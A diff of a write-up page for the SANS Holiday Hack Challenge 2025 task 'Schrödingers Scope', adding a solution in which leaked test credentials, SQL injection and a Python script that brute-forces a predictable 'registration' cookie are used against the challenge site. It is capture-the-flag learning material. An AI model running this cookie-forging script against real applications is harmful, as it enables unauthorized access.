@@ -32,29 +32,29 @@ Kevin McFarland mission statement The Neighborhood College Course Registration S
 For any web application test, one of the most important things for the test is the ‘scope’, that is, what one is permitted to test and what one should not. While hacking is fun and cool, professional integrity means respecting scope boundaries, especially when there are tempting targets outside our permitted scope.">
     <meta itemprop="datePublished" content="2025-11-30T11:48:19+01:00">
     <meta itemprop="dateModified" content="2025-11-30T11:48:19+01:00">
-    <meta itemprop="wordCount" content="1069">
+    <meta itemprop="wordCount" content="1454">
     <title>Schrödingers Scope :: SANS Holiday Hack Challenge 2025</title>
     <link href="/act3/schrodingers-scope/index.xml" rel="alternate" type="application/rss+xml" title="Schrödingers Scope :: SANS Holiday Hack Challenge 2025">
-    <link href="/css/auto-complete/auto-complete.min.css?1765986156" rel="stylesheet">
-    <script src="/js/auto-complete/auto-complete.min.js?1765986156" defer></script>
-    <script src="/js/search-lunr.js?1765986156" defer></script>
-    <script src="/js/search.js?1765986156" defer></script>
+    <link href="/css/auto-complete/auto-complete.min.css?1766052395" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1766052395" defer></script>
+    <script src="/js/search-lunr.js?1766052395" defer></script>
+    <script src="/js/search.js?1766052395" defer></script>
     <script>
       window.relearn = window.relearn || {};
-      window.relearn.index_js_url="/searchindex.en.js?1765986156";
+      window.relearn.index_js_url="/searchindex.en.js?1766052395";
     </script>
-    <script src="/js/lunr/lunr.min.js?1765986156" defer></script>
-    <script src="/js/lunr/lunr.stemmer.support.min.js?1765986156" defer></script>
-    <script src="/js/lunr/lunr.multi.min.js?1765986156" defer></script>
-    <script src="/js/lunr/lunr.en.min.js?1765986156" defer></script>
+    <script src="/js/lunr/lunr.min.js?1766052395" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1766052395" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1766052395" defer></script>
+    <script src="/js/lunr/lunr.en.min.js?1766052395" defer></script>
     <script>
       window.relearn = window.relearn || {};
       window.relearn.contentLangs=['en'];
     </script>
-    <link href="/fonts/fontawesome/css/fontawesome-all.min.css?1765986156" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/fontawesome-all.min.css?1765986156" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1765986156" rel="stylesheet">
-    <link href="/css/theme.css?1765986156" rel="stylesheet">
-    <link href="/css/format-html.css?1765986156" rel="stylesheet" id="R-format-style">
+    <link href="/fonts/fontawesome/css/fontawesome-all.min.css?1766052395" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/fontawesome-all.min.css?1766052395" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1766052395" rel="stylesheet">
+    <link href="/css/theme.css?1766052395" rel="stylesheet">
+    <link href="/css/format-html.css?1766052395" rel="stylesheet" id="R-format-style">
     <script>
       window.relearn = window.relearn || {};
       // configuration
@@ -135,11 +135,11 @@ For any web application test, one of the most important things for the test is t
         <li><a href="#found-commented-out-course-search">Found commented-out course search</a></li>
         <li><a href="#identified-sql-injection-vulnerability">Identified SQL injection vulnerability</a></li>
         <li><a href="#reported-the-unauthorized-gnome-course">Reported the unauthorized gnome course</a></li>
-        <li><a href="#xss">XSS</a></li>
-        <li><a href="#hints">Hints</a></li>
+        <li></li>
       </ul>
     </li>
     <li><a href="#kevin-mcfarland-mission-debrief">Kevin McFarland mission debrief</a></li>
+    <li><a href="#hints">Hints</a></li>
   </ul>
 </nav>
                 </div>
@@ -176,8 +176,8 @@ For any web application test, one of the most important things for the test is t
 
 <h1 id="schrödingers-scope">Schrödingers Scope</h1>
 
-<p><a href="#R-image-c36a9e9b455156ccbf9ff319f182697e" class="lightbox-link"><img alt="Kevin McFarland" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/kevinmcfarland-avatar.gif" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-c36a9e9b455156ccbf9ff319f182697e"><img alt="Kevin McFarland" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/kevinmcfarland-avatar.gif"></a></p>
+<p><a href="#R-image-00c17159ca597f5b7fae8a3f4be9df3d" class="lightbox-link"><img alt="Kevin McFarland" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/kevinmcfarland-avatar.gif" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-00c17159ca597f5b7fae8a3f4be9df3d"><img alt="Kevin McFarland" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/kevinmcfarland-avatar.gif"></a></p>
 <h2 id="objective">Objective</h2>
 <p>Difficulty: 3/5</p>
 <p>Kevin in the Retro Store ponders pentest paradoxes—can you solve Schrödinger&rsquo;s Scope?</p>
@@ -192,17 +192,17 @@ For any web application test, one of the most important things for the test is t
 </blockquote>
 <h2 id="solution">Solution</h2>
 <p>This objective is available on this url: <a href="https://flask-schrodingers-scope-firestore.holidayhackchallenge.com" rel="external">https://flask-schrodingers-scope-firestore.holidayhackchallenge.com</a>. Upon entering it I were presented with a Rules of Engagement (RoE) notice:</p>
-<p><a href="#R-image-556631ed488f456acc5f0e0e1f3c8963" class="lightbox-link"><img alt="Rules of engagement" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-1.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-556631ed488f456acc5f0e0e1f3c8963"><img alt="Rules of engagement" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-1.png"></a></p>
+<p><a href="#R-image-a050542cda4be099784a5bf9d3172bb0" class="lightbox-link"><img alt="Rules of engagement" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-1.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-a050542cda4be099784a5bf9d3172bb0"><img alt="Rules of engagement" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-1.png"></a></p>
 <p>After closing the RoE I was presented with this landing page:</p>
-<p><a href="#R-image-d97905b46530dace29dfe6f09b577cb4" class="lightbox-link"><img alt="Landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-2.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-d97905b46530dace29dfe6f09b577cb4"><img alt="Landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-2.png"></a></p>
+<p><a href="#R-image-45bc1807604f0bce8593036dba7c9050" class="lightbox-link"><img alt="Landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-2.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-45bc1807604f0bce8593036dba7c9050"><img alt="Landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-2.png"></a></p>
 <p>Clicking on the &ldquo;Enter Registration System&rdquo; I was lead to this page:</p>
-<p><a href="#R-image-f615b74e30b6e7b9e281db2c6a41f874" class="lightbox-link"><img alt="Student login" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-3.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-f615b74e30b6e7b9e281db2c6a41f874"><img alt="Student login" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-3.png"></a></p>
+<p><a href="#R-image-c0bb6713c07baefa3ef1d9dddff666af" class="lightbox-link"><img alt="Student login" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-3.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-c0bb6713c07baefa3ef1d9dddff666af"><img alt="Student login" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-3.png"></a></p>
 <p>As I were looking around the site I kept a close eye on the <em>/status_report</em> endpoint, even if I kept myself to <em>/register</em> I ended up with violations no matter what I did. Also, I noticed that there was a small gnome hiding in the bottom left corner when I looked over my screenshots.</p>
-<p><a href="#R-image-ac6ed7feb6eafc9bd1f62e38905f4aa0" class="lightbox-link"><img alt="Violations" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-4.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-ac6ed7feb6eafc9bd1f62e38905f4aa0"><img alt="Violations" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-4.png"></a></p>
+<p><a href="#R-image-f859f5bc45e3c4513148c90fb39c3e56" class="lightbox-link"><img alt="Violations" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-4.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-f859f5bc45e3c4513148c90fb39c3e56"><img alt="Violations" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-4.png"></a></p>
 <h3 id="getting-rid-of-the-vandaling-gnome">Getting rid of the vandaling Gnome</h3>
 <p>Reading up on the hints I was told to watch out for tiny, pesky gnomes who may be violating my progess. That gnome in the left bottom corner seemed to fit the bill. I then started to backtrack and reading up on the HTML source, and soon I found something interesting:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
@@ -305,12 +305,12 @@ For any web application test, one of the most important things for the test is t
   </tbody>
 </table>
 <p>Path <em>/register/dev/dev_todos</em> contains <em>Uncovered developer information disclosure</em>:</p>
-<p><a href="#R-image-740baa2bb0c4bc9f3ef2fcc87e4606dc" class="lightbox-link"><img alt="Uncovered developer information disclosure." class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-5.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-740baa2bb0c4bc9f3ef2fcc87e4606dc"><img alt="Uncovered developer information disclosure." class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-5.png"></a></p>
+<p><a href="#R-image-a90c36abe25286956e4c37105908b651" class="lightbox-link"><img alt="Uncovered developer information disclosure." class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-5.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-a90c36abe25286956e4c37105908b651"><img alt="Uncovered developer information disclosure." class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-5.png"></a></p>
 <h3 id="exploited-information-disclosure-via-login">Exploited Information Disclosure via login</h3>
 <p>Logged in using the credentials I just found: <code>teststudent:2025h0L1d4y5</code></p>
-<p><a href="#R-image-112d601f83c0dde5502c2304a4f2ebc2" class="lightbox-link"><img alt="Logging in as test student." class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-6.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-112d601f83c0dde5502c2304a4f2ebc2"><img alt="Logging in as test student." class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-6.png"></a></p>
+<p><a href="#R-image-5c6ebb0ef2d6d656e09359c72750a8ac" class="lightbox-link"><img alt="Logging in as test student." class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-6.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-5c6ebb0ef2d6d656e09359c72750a8ac"><img alt="Logging in as test student." class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-6.png"></a></p>
 <h3 id="found-commented-out-course-search">Found commented-out course search</h3>
 <p>By inspecting the HTML source code I found an interesting comment mentioning a new endpoint:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">section</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;courses-content&#34;</span>&gt;
@@ -323,16 +323,16 @@ For any web application test, one of the most important things for the test is t
 </span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">div</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">section</span>&gt;</span></span></code></pre></div>
 <p>By removing the comment and thus enabling the list, we got:</p>
-<p><a href="#R-image-a58f5b60f19a635a9a8fa6a653640516" class="lightbox-link"><img alt="Enabled course search" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-7.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-a58f5b60f19a635a9a8fa6a653640516"><img alt="Enabled course search" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-7.png"></a></p>
+<p><a href="#R-image-974891287a7ae8aabfd40c8b3f78230d" class="lightbox-link"><img alt="Enabled course search" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-7.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-974891287a7ae8aabfd40c8b3f78230d"><img alt="Enabled course search" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-7.png"></a></p>
 <h3 id="identified-sql-injection-vulnerability">Identified SQL injection vulnerability</h3>
 <p>By visting the link we just enabled I was presented with a search interface to search for courses. After toying with the query input, I figured out that this was SQL Injection all day long:</p>
-<p><a href="#R-image-1308dfc35281f0636011aaa8d7b17982" class="lightbox-link"><img alt="SQL Injection" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-8.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-1308dfc35281f0636011aaa8d7b17982"><img alt="SQL Injection" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-8.png"></a></p>
+<p><a href="#R-image-80c1ded5874111bc6f229b461684622f" class="lightbox-link"><img alt="SQL Injection" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-8.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-80c1ded5874111bc6f229b461684622f"><img alt="SQL Injection" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-8.png"></a></p>
 <h3 id="reported-the-unauthorized-gnome-course">Reported the unauthorized gnome course</h3>
 <p>At the end of the course list there&rsquo;s an entry named <em>&ldquo;GNOME 827 - Mischief Management&rdquo;</em> - clicking on that link lead me to:</p>
-<p><a href="#R-image-6f18f6ce8a062af5bd6fb86ae0e41ab7" class="lightbox-link"><img alt="Report In-Scope vulnerability" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-9.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-6f18f6ce8a062af5bd6fb86ae0e41ab7"><img alt="Report In-Scope vulnerability" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-9.png"></a></p>
+<p><a href="#R-image-0d8bd6c1597676841cd4a0dd4bff176a" class="lightbox-link"><img alt="Report In-Scope vulnerability" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-9.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-0d8bd6c1597676841cd4a0dd4bff176a"><img alt="Report In-Scope vulnerability" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-9.png"></a></p>
 <p>The popup offers three options:</p>
 <ul>
 <li>Report</li>
@@ -340,11 +340,90 @@ For any web application test, one of the most important things for the test is t
 <li>Continue</li>
 </ul>
 <p>At the same time it urges for me to report the vulnerability. And so I did.</p>
-<hr>
-<p>After finding the information disclosure, the onscreen gnomes hinted at this URL: <code>https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search/student_lookup?id=1da0186b-4709-4edc-80be-fe43675c480d</code></p>
-<p>However, this is out of scope.</p>
-<h3 id="xss">XSS</h3>
-<h3 id="hints">Hints</h3>
+<h3></h3>
+<p>Early in the game I found an endpoint, <em>/register/dev/dev_notes</em>, that gave me an <em>HTTP 403</em> error. I decided it was time to revisit it to see if I now had access since I was logged in with the <em>testuser</em> account. And so I had:</p>
+<p><a href="#R-image-0e72ddcdd62a6435781a6b51db0d494f" class="lightbox-link"><img alt="I have access now" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-10.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-0e72ddcdd62a6435781a6b51db0d494f"><img alt="I have access now" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-10.png"></a></p>
+<p>From the looks of it I am to look for the <em>holiday behavor</em> class, but it is <em>wip</em> state. By looking back at the other classes for inspiration, I decided to just add <em>wip</em> and specify the new class I was looking for in the url:</p>
+<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/register/courses/wip/holiday_behavior</span></span></code></pre></div>
+<p>This brought me to another 403 error screen:</p>
+<p><a href="#R-image-49faa775bda90403130676629f65a3c7" class="lightbox-link"><img alt="Another 403 error screen" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-11.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-49faa775bda90403130676629f65a3c7"><img alt="Another 403 error screen" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-11.png"></a></p>
+<p>It complained about invalid session registration value, so I took a look at the cookies:</p>
+<p><a href="#R-image-7219737dee9b8c666315c3ef8d7b9dfc" class="lightbox-link"><img alt="Cookies" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-12.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-7219737dee9b8c666315c3ef8d7b9dfc"><img alt="Cookies" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-12.png"></a></p>
+<p>Interesting. The registration cookie contains a HEX, upon refreshing the pages multiple times I figures out this HEX code is not random as could be. I hacked together å Python script to find an assortion of HEX codes to see if it was a pattern somewhere. It was. Each HEX was prefixed with <code>eb72a05369dcb4</code>, and there were only 20 values or so in use. I then extended my Python script to calculate the full range of the last to HEX values, and then bruteforce my way in. The script ended up looking like this:</p>
+<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pprint <span style="color:#f92672">import</span> pprint
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>schrodinger_token <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;e5e15381-843b-43fb-90d7-8b9eacc6c00b&#34;</span>
+</span></span><span style="display:flex;"><span>get_param_id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;4ed10eeb-35ae-4f83-91b3-3e0c90969799&#34;</span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/?id=</span><span style="color:#e6db74">{</span>get_param_id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> requests<span style="color:#f92672">.</span>Session() <span style="color:#66d9ef">as</span> s:
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>set(
+</span></span><span style="display:flex;"><span>        name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Schrodinger&#34;</span>,
+</span></span><span style="display:flex;"><span>        value <span style="color:#f92672">=</span> schrodinger_token
+</span></span><span style="display:flex;"><span>    )    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    registration_cookies <span style="color:#f92672">=</span> set()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range (<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">50</span>):
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(url)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        registration_cookies<span style="color:#f92672">.</span>add(r<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;registration&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(len(registration_cookies))
+</span></span><span style="display:flex;"><span>    pprint(registration_cookies)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    min_value <span style="color:#f92672">=</span> min(registration_cookies)
+</span></span><span style="display:flex;"><span>    prefix <span style="color:#f92672">=</span> min_value[:<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>    start <span style="color:#f92672">=</span> int(min_value[<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>:], <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    candidates <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}{</span>i<span style="color:#e6db74">:</span><span style="color:#e6db74">02x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x100</span>)
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    candidates <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(start, start <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100</span>):
+</span></span><span style="display:flex;"><span>        candidates<span style="color:#f92672">.</span>append(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>prefix<span style="color:#e6db74">}{</span>(i <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)<span style="color:#e6db74">:</span><span style="color:#e6db74">02x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    length_candidates <span style="color:#f92672">=</span> len(candidates)
+</span></span><span style="display:flex;"><span>    counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> candidate <span style="color:#f92672">in</span> candidates:
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>set(
+</span></span><span style="display:flex;"><span>            name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;registration&#34;</span>,
+</span></span><span style="display:flex;"><span>            value <span style="color:#f92672">=</span> candidate
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/courses/wip/holiday_behavior?id=</span><span style="color:#e6db74">{</span>get_param_id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(url)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;403 Forbidden&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[</span><span style="color:#e6db74">{</span>counter<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>length_candidates<span style="color:#e6db74">}</span><span style="color:#e6db74">] Register: </span><span style="color:#e6db74">{</span>candidate<span style="color:#e6db74">}</span><span style="color:#e6db74"> =&gt; NOPE&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[</span><span style="color:#e6db74">{</span>counter<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>length_candidates<span style="color:#e6db74">}</span><span style="color:#e6db74"> ] Register: </span><span style="color:#e6db74">{</span>candidate<span style="color:#e6db74">}</span><span style="color:#e6db74"> =&gt; YES&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        counter <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span></span></span></code></pre></div>
+<p>The script found the desired cookie value after 11 tries:</p>
+<p><a href="#R-image-751d0006f23038d744b7ba65e9f109d7" class="lightbox-link"><img alt="Finding the cookie value" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-13.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-751d0006f23038d744b7ba65e9f109d7"><img alt="Finding the cookie value" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-13.png"></a></p>
+<p>Then I just took this cookie value and edited the &ldquo;registration&rdquo; cookie in my browser and hit refresh:</p>
+<p><a href="#R-image-a3d019f91c0731f42a4ef18312cd6a03" class="lightbox-link"><img alt="Finalizing" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-14.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-a3d019f91c0731f42a4ef18312cd6a03"><img alt="Finalizing" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-14.png"></a></p>
+<p>Finalizing it I were given a nice diploma I could hang behind the refrigerator:</p>
+<p><a href="#R-image-090378f7ffd025a21bf1ed46e142df5e" class="lightbox-link"><img alt="A diploma" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-schrodinger-15.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-090378f7ffd025a21bf1ed46e142df5e"><img alt="A diploma" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-schrodinger-15.png"></a></p>
+<h2 id="kevin-mcfarland-mission-debrief">Kevin McFarland mission debrief</h2>
+<blockquote>
+<p>Well done - you’ve shown the wisdom to stay within scope, uncover what mattered, and respecting other testing boundaries.</p>
+<p>That kind of discipline is what separates a real penetration tester from someone just poking around.</p>
+</blockquote>
+<h2 id="hints">Hints</h2>
 <ol>
 <li>
 <p>Though it might be more interesting to start off trying clever techniques and exploits, always start with the simple stuff first, such as reviewing HTML source code and basic SQLi.</p>
@@ -362,9 +441,6 @@ For any web application test, one of the most important things for the test is t
 <p>As you test this with a tool like Burp Suite, resist temptations and stay true to the instructed path.</p>
 </li>
 </ol>
-<h2 id="kevin-mcfarland-mission-debrief">Kevin McFarland mission debrief</h2>
-<blockquote>
-</blockquote>
 
   <footer class="footline">
               <i class='fa-fw fas fa-calendar'></i> Nov 30, 2025
@@ -440,8 +516,8 @@ For any web application test, one of the most important things for the test is t
 <div id="R-footer"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
       </div>
     </aside>
-    <script src="/js/clipboard/clipboard.min.js?1765986156" defer></script>
-    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1765986156" defer></script>
-    <script src="/js/theme.js?1765986156" defer></script>
+    <script src="/js/clipboard/clipboard.min.js?1766052395" defer></script>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1766052395" defer></script>
+    <script src="/js/theme.js?1766052395" defer></script>
   </body>
 </html>
